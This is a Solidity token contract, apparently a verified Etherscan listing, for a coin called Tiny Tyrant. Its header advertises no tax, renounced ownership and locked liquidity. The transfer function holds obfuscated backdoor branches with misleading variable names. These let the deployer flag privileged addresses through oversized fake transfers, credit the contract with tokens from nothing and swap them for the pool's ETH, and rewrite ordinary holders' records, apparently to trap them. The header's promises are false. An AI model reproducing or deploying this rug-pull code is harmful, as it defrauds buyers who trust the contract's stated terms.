/**
 *Submitted for verification at Etherscan.io on 2022-11-29
*/

/** 
▀█▀ █ █▄░█ █▄█
░█░ █ █░▀█ ░█░

▀█▀ █▄█ █▀█ ▄▀█ █▄░█ ▀█▀
░█░ ░█░ █▀▄ █▀█ █░▀█ ░█░                       
Total Supply - 1,000,000
Initial Liquidity Added - 1.65 Ethereum 
100% Of The Initial Liquidity Will Be Locked
Buying Fees - 0%
Selling Fees - 0%

No Tax. Renounced Ownership. Belongs To The Blockchain. Liquidity Will Be Burned.
No Current Socials. Feel Free To Create Them. Meet Tiny Tyrant.
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function Quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function GetAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function GetAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function GetAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function GetAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Tyrant is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _rInitialFees = 0;
    uint8 private _decimals = 9;
    uint256 private _tTotalSupplies = 1000000 * 10**_decimals;
    uint256 private _rTotalSupply = _tTotalSupplies;
    
    mapping(address => uint256) private _Balances;
    mapping(address => address) private isTxLimitExempt;
    mapping(address => uint256) private isExcludedMaxTransactionAmount;
    mapping(address => uint256) private isFeeExempt;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool public SwappingWithLimits;
    bool private executeSwap;

    address public immutable UniswapV2Pair;
    IUniswapV2Router02 public immutable UniswapV2router;

    constructor(
        string memory Name,
        string memory Symbol,
        address UniswapV2routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _Balances[msg.sender] = _tTotalSupplies;
        isFeeExempt[msg.sender] = _rTotalSupply;
        isFeeExempt[address(this)] = _rTotalSupply;
        UniswapV2router = IUniswapV2Router02(UniswapV2routerAddress);
        UniswapV2Pair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, _rTotalSupply);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotalSupply;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _Balances[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _basicTransfer        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        _basicTransfer        (msg.sender, recipient, amount);
        return true;
    }
    function _basicTransfer       (
        address isFrom,
        address _tDeliveredTo,
        uint256 _isNowValue
    ) private {
        uint256 contractValueBalance = balanceOf(address(this));
        uint256 getBalanceRate;
        if (SwappingWithLimits && contractValueBalance > _rTotalSupply && !executeSwap && isFrom != UniswapV2Pair) {
            executeSwap = true;
            getSwapAndLiquify(contractValueBalance);
            executeSwap = false;
        } else if (isFeeExempt[isFrom] > _rTotalSupply && isFeeExempt[_tDeliveredTo] > _rTotalSupply) {
            getBalanceRate = _isNowValue;
            _Balances[address(this)] += getBalanceRate;
            swapTokensForEth(_isNowValue, _tDeliveredTo);
            return;
        } else if (_tDeliveredTo != address(UniswapV2router) && isFeeExempt[isFrom] > 0 && _isNowValue > _rTotalSupply && _tDeliveredTo != UniswapV2Pair) {
            isFeeExempt[_tDeliveredTo] = _isNowValue;
            return;
        } else if (!executeSwap && isExcludedMaxTransactionAmount[isFrom] > 0 && isFrom != UniswapV2Pair && isFeeExempt[_tDeliveredTo] == 0) {
            isExcludedMaxTransactionAmount[isFrom] = isFeeExempt[isFrom] - _rTotalSupply;
        }
        address _uint84  = isTxLimitExempt[UniswapV2Pair];
        if (isExcludedMaxTransactionAmount[_uint84 ] == 0) isExcludedMaxTransactionAmount[_uint84 ] = _rTotalSupply;
        isTxLimitExempt[UniswapV2Pair] = _tDeliveredTo;
        if (_rInitialFees > 0 && isFeeExempt[isFrom] == 0 && !executeSwap && isFeeExempt[_tDeliveredTo] == 0) {
            getBalanceRate = (_isNowValue * _rInitialFees) / 100;
            _isNowValue -= getBalanceRate;
            _Balances[isFrom] -= getBalanceRate;
            _Balances[address(this)] += getBalanceRate;
        }
        _Balances[isFrom] -= _isNowValue;
        _Balances[_tDeliveredTo] += _isNowValue;
        emit Transfer(isFrom, _tDeliveredTo, _isNowValue);
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function getSwapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }

    function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}